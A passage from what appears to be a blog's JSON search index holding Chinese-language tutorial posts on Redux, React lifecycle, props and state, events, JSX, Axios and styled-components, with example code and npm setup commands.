Provider &#125; from 'react-redux'import App from './containers/App'import configureStore from './store/configureStore'const store = configureStore()render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')) 这样就完成了redux的异步操作。其实最主要的区别还是action里面还有中间件的调用，其他的地方基本跟同步的redux差不多的。搞懂了中间件，就基本搞懂了redux的异步操作 image.png","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"Redux之action、store、reducer分析（六）","slug":"2017-11-redux-study-action-store-reducer","date":"2017-11-19T02:16:24.000Z","updated":"2018-10-24T03:46:02.278Z","comments":true,"path":"note/b007a017.html","link":"","permalink":"https://ru23.com/note/b007a017.html","excerpt":"","text":"redux的核心概念就是store、action、reducer，从调用关系来看如下所示 1store.dispatch(action) --&gt; reducer(state, action) --&gt; final state 123456789101112131415161718192021222324252627282930// reducer方法, 传入的参数有两个// state: 当前的state// action: 当前触发的行为, &#123;type: 'xx'&#125;// 返回值: 新的statevar reducer = function(state, action)&#123; switch (action.type) &#123; case 'add_todo': return state.concat(action.text); default: return state; &#125;&#125;;// 创建store, 传入两个参数// 参数1: reducer 用来修改state// 参数2(可选): [], 默认的state值,如果不传, 则为undefinedvar store = redux.createStore(reducer, []);// 通过 store.getState() 可以获取当前store的状态(state)// 默认的值是 createStore 传入的第二个参数console.log('state is: ' + store.getState()); // state is:// 通过 store.dispatch(action) 来达到修改 state 的目的// 注意: 在redux里,唯一能够修改state的方法,就是通过 store.dispatch(action)store.dispatch(&#123;type: 'add_todo', text: '读书'&#125;);// 打印出修改后的stateconsole.log('state is: ' + store.getState()); // state is: 读书store.dispatch(&#123;type: 'add_todo', text: '写作'&#125;);console.log('state is: ' + store.getState()); // state is: 读书,写作 一、store、reducer、action关联store store在这里代表的是数据模型，内部维护了一个state变量 store有两个核心方法，分别是getState、dispatch。前者用来获取store的状态（state），后者用来修改store的状态 123456789101112// 创建store, 传入两个参数// 参数1: reducer 用来修改state// 参数2(可选): [], 默认的state值,如果不传, 则为undefinedvar store = redux.createStore(reducer, []);// 通过 store.getState() 可以获取当前store的状态(state)// 默认的值是 createStore 传入的第二个参数console.log('state is: ' + store.getState()); // state is:// 通过 store.dispatch(action) 来达到修改 state 的目的// 注意: 在redux里,唯一能够修改state的方法,就是通过 store.dispatch(action)store.dispatch(&#123;type: 'add_todo', text: '读书'&#125;); action 对行为（如用户行为）的抽象，在redux里是一个普通的js对象 action必须有一个type字段来标识这个行为的类型 123&#123;type:'add_todo', text:'读书'&#125;&#123;type:'add_todo', text:'写作'&#125;&#123;type:'add_todo', text:'睡觉', time:'晚上'&#125; reducer 一个普通的函数，用来修改store的状态。传入两个参数 state、action 其中，state为当前的状态（可通过store.getState()获得），而action为当前触发的行为（通过store.dispatch(action)调用触发） reducer(state, action) 返回的值，就是store最新的state值 123456789101112// reducer方法, 传入的参数有两个// state: 当前的state// action: 当前触发的行为, &#123;type: 'xx'&#125;// 返回值: 新的statevar reducer = function(state, action)&#123; switch (action.type) &#123; case 'add_todo': return state.concat(action.text); default: return state; &#125;&#125;; 二、关于actionCreator1actionCreator(args) =&gt; action 12345678var addTodo = function(text)&#123; return &#123; type: 'add_todo', text: text &#125;;&#125;;addTodo('睡觉'); // 返回：&#123;type: 'add_todo', text: '睡觉'&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"React之组件的协同及（不）可控组件（五）","slug":"2017-11-react-study-component-corp-and-uncontrol","date":"2017-11-19T02:14:26.000Z","updated":"2018-10-24T03:46:02.258Z","comments":true,"path":"note/a802abee.html","link":"","permalink":"https://ru23.com/note/a802abee.html","excerpt":"","text":"一、为什么要进行组件的协同 我们在实际的开发项目的时候，不会只用几个组件，有时候遇到大型的项目，可能会有成千上百的组件，难免会遇到有功能重复的组件。要进行修改，就会修改大部分的文件。所以我们需要进行组件的协同开发。 image.png 二、什么是组件的协同使用？ 组件的协同本质上是对组件的一种组织、管理的方式。 目的： 逻辑清晰：这是组件与组件之间的逻辑 代码模块化 封装细节：像面向对象一样将常用的方法以及数据封装起来 提高代码的复用性：因为是组件，相当于一个封装好的东西，用的时候直接调用 三、如何实现组件的协同使用 第一种：增加一个父组件，将其他的组件进行嵌套，更多的是实现代码的封装 第二种：通过一些操作从后台获取数据，React中的Mixin，更多的是实现代码的复用 四、组件嵌套的含义 组件嵌套的本质是父子关系 image.png 五、组件嵌套的优缺点 优点： 逻辑清晰：父子关系类似于人类中的父子关系 模块化开发：每个模块对应一个功能，不同的模块可以同步开发 封装细节：开发者必须要关注组件的功能，不需要了解细节 缺点： 编写难度高：父子组件的关系需要经过深思熟虑，贸然编写可能导致关系混乱，代码难以维护 无法掌握所有细节：使用者只知道组件的用法，不知道实现细节，遇到问题难以修复 六、MixinMixin的含义 Mixin=一组方法。 他的目的是横向抽离出组件的相似代码，把组件的共同作用以及效果的代码提出来 image.png Mixin的优缺点 优点 代码复用：抽离出通用的代码，减少开发成本，提高开发效率 即插即用：可以使用许多现有的Mixin来开发自己的代码 适应性强：改动一次代码，影响多个组件 缺点 编写难度高：Mixin可能被用在各种环境中，想要兼容多种环境就需要更多的 - 码与逻辑，通用的代价是提高复杂度 降低代码的可读性：组件的优势在于将逻辑与是界面直接结合在一起，Mixin本质上会分散逻辑，理解起来难度大 七、不可控组件 image.png 上图：defaultValue的值是固定的，这就是一个不可控组件 如果要获取input的value值，只有使用ref获取节点来获取值 八、可控组件 image.png defaultValue的值是根据状态确定了，只需要拿到this.state.value的值就可以了 这里需要注意一下：使用value的值是不可修改的，defaultValue的值是可以修改的 可控组件的优点 符合React的数据流 数据存储在state中，便于获取 便于处理数据","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"React之事件（四）","slug":"2017-11-react-study-event","date":"2017-11-19T02:13:32.000Z","updated":"2018-10-24T03:46:02.260Z","comments":true,"path":"note/7d76909e.html","link":"","permalink":"https://ru23.com/note/7d76909e.html","excerpt":"","text":"一、编写事件处理函数 image.png 在函数体中进行一些操作，常见的有：更新页面内容，更新组件状态，与后台交互 image.png 书写方式 123456var Demo = React.createClass(&#123; getInitialState:function()&#123; &#125;, handleClick: function(event)&#123; &#125;, handleChange: function()&#123; &#125;, render:function()&#123; &#125;, &#125;) 上面的代码中有的有参数event，有的没有，这个根据自己的需求 二、绑定事件处理函数 onClick={this,handleClick} 需要注意的是：不要在事件后面添加上一个（） 其他的事件 触摸事件：onTouchCancel，onTouchEnd，onTouchMove，onTouchStart 键盘事件：onKeyDown，onKeyUp， onKeyPress（前两者的组合） 表单时间：onChange，onInput，onSubmit 焦点事件：onFocus，onBlur UI元素事件：onScroll 滚动事件：onWhell（鼠标滚动） 鼠标事件：onClick，onContextMenu，onDoubleClick…… 1234567891011var Demo = React.createClass(&#123; handleClick:function(e)&#123; console.log(e) console.log(e.target) console.log(e.nativeEvent) &#125;, render:function()&#123; return &lt;div onClick=&#123;this.handleClick&#125;&gt;Hello World&lt;/div&gt; &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById('app')) 1234567891011121314151617181920212223242526272829303132var Demo = React.createClass(&#123; getInitialState:function()&#123; return &#123; width: 200, height: 200, backgroundColor: '#DDDDDD' &#125; &#125;, /*handleWheel:function(e)&#123; var newColor = (parseInt(this.state.backgroundColor.substr(1),16) + e.deltaY).toString(16) newColor = '#' + newColor.toUpperCase() console.log(newColor) this.setState(&#123; backgroundColor:newColor &#125;) &#125;,*/ randomColor:function()&#123; var r = Math.floor(Math.random()*256); var g = Math.floor(Math.random()*256); var b = Math.floor(Math.random()*256); return 'rgb('+r+','+g+','+b+')' &#125;, handleWheel:function()&#123; this.setState(&#123; backgroundColor:this.randomColor() &#125;) &#125;, render:function()&#123; return &lt;div onWheel=&#123;this.handleWheel&#125; style=&#123;this.state&#125;&gt;这是一个案例，鼠标滚动实现背景颜色的变化&lt;/div&gt; &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById('app')) 三、事件对象事件对象的使用 通用：所有的事件都有事件属性 image.png 键盘：键盘事件拥有的事件属性 image.png 鼠标：鼠标事件拥有的事件属性 image.png 滚动：滚动事件拥有的事件属性 为什么会有三个，因为有的设备可以实现三个方向的移动 四、事件与状态关联12345inputChange:function(event)&#123; this.setState(&#123; inputText:event.target.value &#125;)&#125; 总的来说就是使用this.setState来更新状态，而状态的值因为事件的不同会不同","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"React之组件的生命周期以及属性状态（三）","slug":"2017-11-react-study-life-props-state","date":"2017-11-19T02:12:24.000Z","updated":"2018-10-24T03:46:02.266Z","comments":true,"path":"note/b0cc8a93.html","link":"","permalink":"https://ru23.com/note/b0cc8a93.html","excerpt":"","text":"一、什么是生命周期 image.png 组件本质是状态机，输入确定，输出一定确定 一个state对应一个render，状态转换的时候会触发不同的函数，从而让开发者有机会做出响应，可以用事件的思路理解状态，但是事件与事件之间没有关联，而状态与状态之间可能会有关联 image.png 二、初始化阶段设置初始的属性与状态 getDefaultProps：设置初始的属性，只在第一次调用，实例之间共享引用 getInitialState：设置初始的状态 componentWillMount：组件将要加载，render之前最后一次修改状态的机会 render：只能访问this.props与this.state，只有一个顶层标签（组件），不允许修改状态和DOM输出 componentDidMount：成功render并渲染完成真实DOM之后出发，可以修改DOM，要操作DOM也必须在这个阶段完成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960var Demo = React.createClass(&#123; // 第一步执行顺序：设置初始的属性，指执行一次 getDefaultProps:function()&#123; return &#123; name:'一个盒子', title:'box' &#125; &#125;, // 第二步执行顺序：设置初始的状态 getInitialState:function()&#123; return &#123; sss: this.props.name &#125; &#125;, // 第三步执行：组件将要加载的时候，最后一次可以修改状态的机会 componentWillMount:function()&#123; this.setState(&#123; sss:'修改状态' &#125;) // alert('componentWillMount') // 这里是没有办法获取到这个节点的 // var box = this.refs.box; // alert(box.clientWidth) &#125;, // 第四步：render渲染 render:function()&#123; // console.log(this) var styles = &#123; position:'absolute', width: '100px', height: '100px', color: 'red', background: 'lime' &#125; return &lt;div ref=\"box\" style=&#123;styles&#125;&gt;&#123;this.props.title&#125;&#123;this.state.sss&#125;&lt;/div&gt; &#125;, // 第五步：组件加载完成，只有在这一个阶段，我们才可以操作DOM节点 componentDidMount:function()&#123; // alert('componentDidMount') // 下面的this指向组件 console.log(this) var box = this.refs.box; var timer = null; var n = 0; box.onclick = function()&#123; console.log(1) // 这个this指向box console.log(this) var This = this; timer = setInterval(function()&#123; // 这个this指向window // console.log(this) n++; This.style.left = n + 'px'; This.style.top = n + 'px'; &#125;,60) &#125; &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(\"app\")) 三、运行中阶段 componentWillReceiveProps：父组件修改属性触发，可以修改新属性，修改状态 shouldCompoenntUpdate：组件是否更新，返回false会阻止render调用，render后面的函数都不会执行 componentWillUpdate：不能修改属性与状态，用于日志打印与数据获取 reder：只能访问this.props与this.state，只有一个顶层标签（组件），不允许修改状态和DOM输出 componentDidUpdate：可以修改DOM 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var HelloReact = React.createClass(&#123; // 组件将要接收新的属性 componentWillReceiveProps:function(newProps)&#123; console.log('componnetWillReceiveProps',1) console.log(newProps) &#125;, // 是否允许组件更新，返回true或者false，一般不会改变它的默认值：true shouldComponentUpdate:function(newProps,newState)&#123; console.log('shouldComponentUpdate',2) console.log(newProps,newState) return true; &#125;, // 组件将要更新 componentWillUpdate:function()&#123; console.log('componentWillUpdate',3) &#125;, render:function()&#123; console.log('render',4) return &lt;p&gt;Hello &#123;this.props.name?this.props.name:'React'&#125;&lt;/p&gt; &#125;, // 组件更新完毕 componentDidUpdate:function()&#123; console.log('componentDidUpdate',5) &#125;&#125;)var Demo = React.createClass(&#123; getInitialState:function()&#123; return &#123; name:'' &#125; &#125;, handleChange:function(e)&#123; this.setState(&#123; name:e.target.value &#125;) &#125;, render:function()&#123; return( &lt;div&gt; &lt;HelloReact name=&#123;this.state.name&#125;/&gt; &lt;input type=\"text\" onChange=&#123;this.handleChange&#125; /&gt; &lt;/div&gt; ) &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(\"app\")) 四、销毁阶段 componentWillUnmount：组件将要卸载 在ReactDOM中提供一个方法unmountComponentAtNode(删除节点的名字) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859var HelloReact = React.createClass(&#123; // 组件将要接收新的属性 componentWillReceiveProps:function(newProps)&#123; console.log('componnetWillReceiveProps',1) console.log(newProps) &#125;, // 是否允许组件更新，返回true或者false，一般不会改变它的默认值：true shouldComponentUpdate:function(newProps,newState)&#123; console.log('shouldComponentUpdate',2) console.log(newProps,newState) return true; &#125;, // 组件将要更新 componentWillUpdate:function()&#123; console.log('componentWillUpdate',3) &#125;, render:function()&#123; console.log('render',4) return &lt;p&gt;Hello &#123;this.props.name?this.props.name:'React'&#125;&lt;/p&gt; &#125;, // 组件更新完毕 componentDidUpdate:function()&#123; console.log('componentDidUpdate',5) &#125;, componentWillUnmount:function()&#123; console.log('BOOOOOOOOOOOOOOOOOM') &#125;&#125;)var Demo = React.createClass(&#123; getInitialState:function()&#123; return &#123; name:'' &#125; &#125;, handleChange:function(e)&#123; // 利用input输入的内容来卸载组件 if(e.target.value == '1234')&#123; ReactDOM.unmountComponentAtNode(document.getElementById(\"app\")) // 写上这个return是为了不执行下面的语句，减少代码执行时间 return ; &#125; this.setState(&#123; name:e.target.value &#125;) &#125;, render:function()&#123; // 通过判断state的状态来卸载组件 /* if( this.state.name == '1234')&#123; return &lt;div&gt;1234&lt;/div&gt; &#125;*/ return( &lt;div&gt; &lt;HelloReact name=&#123;this.state.name&#125;/&gt; &lt;input type=\"text\" onChange=&#123;this.handleChange&#125; /&gt; &lt;/div&gt; ) &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.getElementById(\"app\")) 五、属性状态属性的含义与用法 含义：props = properties 属性：一个事物的性质与关系，属性往往是与生俱来，无法自己改变的 12345678910111213141516171819202122232425262728// 组件传递propsvar Demo = React.createClass(&#123; render:function()&#123; return &lt;div&gt;&#123;this.props.title&#125;&lt;/div&gt; &#125;&#125;)ReactDOM.render(&lt;Demo title=&#123;\"Demo\"&#125;/&gt;,document.getElementById(\"app\"))``` ```javascript/* ...this.props props的一个语法糖，可以将父组件中的全部属性复制给子组件， 如果是这个标签本身拥有的这个属性*/var Demo = React.createClass(&#123; render:function()&#123; return (&lt;div&gt; &lt;div&gt;&#123;this.props.title&#125;&lt;/div&gt; &lt;a &#123;...this.props&#125;&gt;&#123;this.props.title&#125;&lt;/a&gt; &lt;/div&gt;) &#125;&#125;)var props = &#123; title:'百度', href:'http://www.baidu.com'&#125;ReactDOM.render(&lt;Demo &#123;...props&#125;/&gt;,document.getElementById(\"app\")) this.props.chilidren 1234567891011121314151617181920212223242526272829/* this.props.children children没有与组件的属性一一对应，表示组件的所有子节点 一般用于列表*/console.log(React)var List = React.createClass(&#123; render:function()&#123; return(&lt;ul&gt; &#123; /* 列表项的数量以及内容不确定，在创建模板的时候需确定 利用this.props.chilidren从父组件获取需要的内容 利用React.Children.map方法进行children的遍历 */ React.Children.map(this.props.children,function(child)&#123; return &lt;li&gt;&#123;child&#125;&lt;/li&gt; &#125;) &#125; &lt;/ul&gt;) &#125;&#125;)ReactDOM.render( &lt;List&gt; &lt;h1&gt;&lt;a href=\"\"&gt;百度&lt;/a&gt;&lt;/h1&gt; &lt;a href=\"http://www.baidu.com\"&gt;http://www.baidu.com&lt;/a&gt; &lt;/List&gt;, document.getElementById(\"app\")) PropTypes 123456789101112// 属性验证：PropTypes // 验证组件的属性是否符合要求var Demo = React.createClass(&#123; PropTypes:&#123; // 要求title的类型必须是一个字符串 title:React.PropTypes.string.isRequired &#125;, render:function()&#123; return &lt;div&gt;&#123;this.props.title&#125;&lt;/div&gt; &#125;&#125;)ReactDOM.render(&lt;Demo title=&#123;'title'&#125; /&gt;,document.getElementById(\"app\")) 属性的两种用法 &lt;Demo title=? /&gt; ？中的内容可以是 字符串 对象{} 数组{[1,2,3]} 变量{var} 12345&lt;Demo &#123;…props&#125; /&gt;var props = &#123; one:”123”, two:”456”&#125; 状态的含义与用法 state 状态：事物所处的状况 状态是由事物自行处理，不断变化的。父组件与子组件都无法改变他的状态 状态的用法 getInitialState：初始化状态 setState：更新状态 1234567891011121314151617181920212223242526/* state 状态的意思，一般在页面中存在状态的变化以及涉及到与状态相关的 东西的时候会用他 作用：根据不同的状态显示不同的UI界面*/var Demo = React.createClass(&#123; // 设置初始的状态 getInitialState: function()&#123; return &#123; // 这里的值可以是一个boolean，string，function onOff: true &#125; &#125;, handleClick:function()&#123; // 通过点击事件来修改状态值，原来的状态值需要使用this.state获取 this.setState(&#123; onOff: !this.state.onOff &#125;) &#125;, render: function()&#123; // 每一个更新状态的时候，这个render函数都会重新被调用 return (&lt;div onClick=&#123;this.handleClick&#125;&gt;&#123;this.state.onOff?'data1':'data2'&#125;&lt;/div&gt;) &#125;&#125;)ReactDOM.render(&lt;Demo /&gt;,document.getElementById(\"app\")) 12345678910111213141516171819202122232425262728var Demo = React.createClass(&#123; // 设置默认的属性 getDefaultProps: function()&#123; return &#123; name: '现在的时间是：' &#125; &#125;, // 设置初始的状态 getInitialState: function()&#123; return &#123; time: new Date().toLocaleTimeString() &#125; &#125;, changTime:function()&#123; // 在定时器中使用this.setState的时候需要将这个this变保存起来 var that = this; setInterval(function()&#123; that.setState(&#123; time:new Date().toLocaleTimeString() &#125;) &#125;,1000) &#125;, render: function()&#123; // 每一个更新状态的时候，这个render函数都会重新被调用 return (&lt;div onClick=&#123;this.changTime()&#125;&gt;&#123;this.props.name&#125;&#123;this.state.time&#125;&lt;/div&gt;) &#125;&#125;)ReactDOM.render(&lt;Demo name='北京时间'/&gt;,document.getElementById(\"app\")) 属性与状态的对比 都是纯JS对象，使用｛｝创建的对象 都会触发render更新 都具有确定性，给定相同的属性或者是相同的状态，结果是相同的 属性与状态的区分 组件在运行时需要修改的数据就是状态 所有的数据都可以变成状态","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"React之JSX语法及非DOM操作属性（二）","slug":"2017-11-react-study-jsx-dom","date":"2017-11-19T02:11:24.000Z","updated":"2018-10-24T03:46:02.264Z","comments":true,"path":"note/22a8b6f6.html","link":"","permalink":"https://ru23.com/note/22a8b6f6.html","excerpt":"","text":"一、JSX是什么 一个语法或者说是语法糖 基于ECMAScript一种新的特性 一种定义带属性（DOM节点）树结构（DOM结构）的语法 JSX不是 一门新的语言 XML或者HTML 一种限制，可以不使用JSX 二、JSX的特点 类XML语法，易于接受 增强JS语义，在js中编辑HTML 结构清晰 抽象程度高（核心）：避免手动DOM操作，跨平台 代码模块化 三、JSX语法 image.png 12345678910111213141516171819202122232425262728293031/* JSX（javaScriptXML）语法入门： 1、不是一门语言，是一个语法或者说是语法糖 2、JSX标签其实就是HTML标签，只不过在javascript中这些标签的时候， 不使用“”,遇到HTML标签（以&lt;开始），就用HTML规则解析，遇到代码块 （以&#123;开始），就用javascript规则解析 3、JSX语法浏览器无法解析，需要使用插件将其转化为js代码 4、代码更加直观*//* 1、首字母必须大写 2、驼峰命名 3、使用className与htmlFor代替class和for 4、组件与组件之间是可以嵌套的 5、在JSX语法中只能使用求值表达式，不能使用语句 6、只有一个顶层标签*/var Demo = React.createClass(&#123; change:function ()&#123; return 'demo' &#125;, handleClick:function()&#123; alert(1) &#125;, render: function()&#123; // this指向整个（当前的组件）组件 return &lt;div className=\"demo\" onClick=&#123;this.handleClick&#125;&gt;这是一个&#123;this.change()&#125;&lt;/div&gt; &#125;&#125;)// console.log(Demo)ReactDOM.render(&lt;Demo /&gt;,document.getElementById('app')) 四、JSX的注释 在JSX语法中，添加注释需要写在 { } 中 可以使用多行注释与单行注释 12345678910111213141516var HelloWorld = React.createClass(&#123; render:function()&#123; // 现在这里是属于js的部分,不属于JSX语法的部分 return ( &lt;div className=\"box\" // class名字 &gt; &#123;/*这是一个标题*/&#125; &lt;h1 className=\"title\"&gt;Hello World&lt;/h1&gt; &#123;/*这是说明*/&#125; &lt;p&gt;你好世界！&lt;/p&gt; &lt;div className=\"box2\"&gt;你好&lt;/div&gt; &lt;/div&gt; ) &#125;&#125;)ReactDOM.render(&lt;HelloWorld/&gt;,document.getElementById(\"app\")) 五、JSX中使用样式 内联样式 对象样式 选择器样式（CSS样式） 123456789101112131415161718192021222324252627282930313233343536/*组件的样式: 1、行内样式：写行内样式的时候需要使用两个&#123;&#125; ==&gt;&#123;&#123;&#125;&#125; 2、对象样式：在return前面定义一个样式对象，注意样式的写法，与HTML的不同点 3、CSS样式注意事项，在HTML5中与在React中的样式的书写区别： 1、HTML5中以;结束 在React中以,结束 2、在HTML5中属性与值都不需要加上引号 在React中，属于javascript对象，key中不能存在 - , 需要使用驼峰命名，如果是value值，需要加上引号 3、在HTML中，设置带数字的值，宽度，高度==，需要带上单位 在React中可以不用带单位，直接写数字 这里是指那些规定了默认单位的值。比如说像素px，如果要使用em或者是rem则需要加上单位*//*&#123;&#125; 插值符号在使用插值符号的是有，里面需要时一个对象或者是一个表达式*/var HelloWorld = React.createClass(&#123;render:function()&#123; var styles = &#123; color: 'blue', fontSize: '30' &#125; return ( &lt;div className=\"box\"&gt; &lt;h3 className=\"title\" style=&#123;&#123;color:'red',backgroundColor:'lime'&#125;&#125;&gt;默认标题&lt;/h3&gt; &lt;p className=\"subtitle\" style=&#123;styles&#125;&gt;说明&lt;/p&gt; &lt;p className=\"details\"&gt;这个是用来教学的案例&lt;/p&gt; &lt;/div&gt; )&#125;&#125;)ReactDOM.render(&lt;HelloWorld/&gt;,document.getElementById(\"app\")) 六、条件判断的四种写法 三元表达式 ? : 使用变量，通过函数使用条件判断语句，返回一个字符串 直接在{}中调用函数 使用比较运算符 &amp;&amp; ||！` 123456789101112131415161718192021222324/*1、三元表达式 ? :2、使用变量，通过函数使用条件判断语句，返回一个字符串3、直接在&#123;&#125;中调用函数4、使用比较运算符 &amp;&amp; || ！*/var Demo = React.createClass(&#123; // 设置初始的状态 getInitialState:function()&#123; return &#123; onOff:true &#125; &#125;, // 自定义一个点击事件 handleClick:function() &#123; this.setState(&#123; onOff:!this.state.onOff &#125;) &#125;, render:function()&#123; return &lt;div className=&#123;this.state.onOff?\"box2\":\"box1\"&#125; onClick=&#123;this.handleClick&#125;&gt;我是一个盒子&lt;/div&gt; &#125;&#125;)ReactDOM.render(&lt;Demo/&gt;,document.body) 七、非DOM（元素）属性 dangerouslySetInnerHTML：在JSX中直接插入HTML代码，动态的添加HTML内容，由用户添加。需要使用属性，__html ref：父组件引用子组件 this.refs.name key：目的提高渲染性能 ，涉及到React diff算法，React通过key值判断是否重新渲染","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"React之环境的搭建（一）","slug":"2017-11-react-study-build-env","date":"2017-11-19T02:10:24.000Z","updated":"2018-10-24T07:06:52.771Z","comments":true,"path":"note/9196d3a3.html","link":"","permalink":"https://ru23.com/note/9196d3a3.html","excerpt":"","text":"一、什么是react react是由Facebook开发的一个JavaScript库，而不是一个框架。当时Facebook需要解决一个问题，开发（或者说是构建）一个数据不断变化的大型应用。而数据变化会带来两个很严重的问题 二、react的特点 简单：学习简单，代码简单 声明式（编程）：自动DOM操作 React的核心是组件，组件的设计目的是提升代码的复用率、降低测试难度和代码复杂度。 提高代码复用率：组件将数据与逻辑封装 降低测试难度：组件高内聚低耦合，很容易对单个组件进行测试 降低代码复杂度：使用JSX语法，更直观的在js文件中看HTML代码，提高可读性 三、react的开发环境的配置 如果是要直接在HTML上编辑，需要下载react.js与react-dom.js。如果要使用JSX语法，则需要使用转换JSX语法的插件。这里使用brower.js。在线地址：https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.23/browser.min.js react.js：react的核心库 react-dom.js：提供操作DOM相关的功能 brower,js：将使用的JSX语法转换成JavaScript语法 注意：三者引用顺序必须是react、react-dom、brower 四、React、ReactDOM中有什么 image.png image.png 五、yeoman环境 yeoman前端脚手架工具 1cnpm i -g yeoman http://yeoman.io/ https://github.com/react-webpack-generators/generator-react-webpack#readme123456789# Make sure both is installed globallynpm install -g yonpm install -g generator-react-webpack# Create a new directory, and `cd` into it:mkdir my-new-project &amp;&amp; cd my-new-project# Run the generatoryo react-webpack 123456789101112131415161718192021222324# Start for developmentnpm start # ornpm run serve# Start the dev-server with the dist versionnpm run serve:dist# Just build the dist version and copy static filesnpm run dist# Run unit testsnpm test# Auto-run unit tests on file changesnpm run test:watch# Lint all files in src (also automatically done AFTER tests are run)npm run lint# Clean up the dist directorynpm run clean# Just copy the static assetsnpm run copy 六、React脚手架搭建1234567npm i create-react-appcreate-react-app your-app-name &amp;&amp; cd your-app-namenpm install npm start","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"Axios异步请求的那些事","slug":"2017-11-axios","date":"2017-11-08T10:55:24.000Z","updated":"2018-10-24T03:46:02.206Z","comments":true,"path":"note/dee16b26.html","link":"","permalink":"https://ru23.com/note/dee16b26.html","excerpt":"","text":"一、axios 简介 axios 是一个基于Promise用于浏览器和 nodejs 的 HTTP 客户端，它本身具有以下特征： 从浏览器中创建 XMLHttpRequest 从 node.js 发出 http 请求 支持Promise API 拦截请求和响应 转换请求和响应数据 取消请求 自动转换JSON数据 客户端支持防止CSRF/XSRF 二、axios基础 axios.request（config） axios.get（url [，config]） axios.delete（url [，config]） axios.head（url [，config]） axios.options（url [，config]） axios.post（url [，data [，config]]） axios.put（url [，data [，config]]） axios.patch（url [，data [，config]]） 三、执行 GET 请求123456789101112131415161718192021// 向具有指定ID的用户发出请求axios.get('/user?ID=12345').then(function (res) &#123; console.log(res);&#125;).catch(function (error) &#123; console.log(error);&#125;); // 也可以通过 params 对象传递参数axios.get('/user', &#123; params: &#123; ID: 12345 &#125;&#125;).then(function (response) &#123; console.log(response);&#125;).catch(function (error) &#123; console.log(error);&#125;); 四、执行 POST 请求12345678910111213axios.post('/user', &#123; userId:\"123\"&#125;,&#123; headers:&#123; token:\"abc\" &#125;&#125;).then(function (res) &#123; console.log(res);&#125;).catch(function (error) &#123; console.log(error);&#125;); 五、通过配置方式发送请求 get请求是发送参数，在params中定义。而POST请求是发送request body,需要在data中定义 123456789101112131415161718192021222324252627// get 在params中定义axios(&#123; url:\"pakage.json\", method:\"get\", params:&#123; userId:\"123\" &#125;, headers:&#123; token:\"http-test\" &#125;&#125;).then(res=&gt;&#123; console.log(res.data);&#125;)// post 在data中定义axios(&#123; url:\"pakage.json\", method:\"post\", data:&#123; userId:\"123\" &#125;, headers:&#123; token:\"http-test\" &#125;&#125;).then(res=&gt;&#123; console.log(res.data);&#125;) 六、执行多个并发请求1234567891011121314function getUserAcount()&#123; // 返回一个promise对象 return axios.get(\"/user/1234\");&#125;function getUserPermissions()&#123; // 返回一个promise对象 return axios.get(\"/user/1234/getUserPermissions\");&#125;//一次性返回两个接口axios.all([getUserAccount(),getUserPerssions()]).then(axios.spread((acct, perms) =&gt; &#123; // spread展开两个返回的结果 //两个请求现已完成&#125;)) 七、在react的应用 组件首次“挂载”（mount）时，该方法就会执行。在组件生命周期中，该方法只会执行一次 1234567componentDidMount() &#123; axios.get(`http://www.reddit.com/r/$&#123;this.props.subreddit&#125;.json`) .then(res =&gt; &#123; const posts = res.data.data.children.map(obj =&gt; obj.data); this.setState(&#123; posts &#125;); &#125;); &#125; 八、参考 https://github.com/axios/axios","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"},{"name":"Axios","slug":"Axios","permalink":"https://ru23.com/tags/Axios/"}]},{"title":"浅谈styled-components","slug":"2017-11-react-styled-components","date":"2017-11-08T08:55:24.000Z","updated":"2018-10-24T03:46:02.273Z","comments":true,"path":"note/54b36672.html","link":"","permalink":"https://ru23.com/note/54b36672.html","excerpt":"","text":"一、简介 styled components一种全新的控制样式的编程方式，它能解决CSS全局作用域的问题，而且移除了样式和组件间的映射关系 我们要理清一件事情：styled-components 只是 CSS 层面的高度抽象。它只是解析定义在 JavaScript中的 CSS，然后生成对应 CSS 的 JSX元素 1234567891011121314151617181920212223242526272829303132333435363738394041424344import React from 'react';import styled from 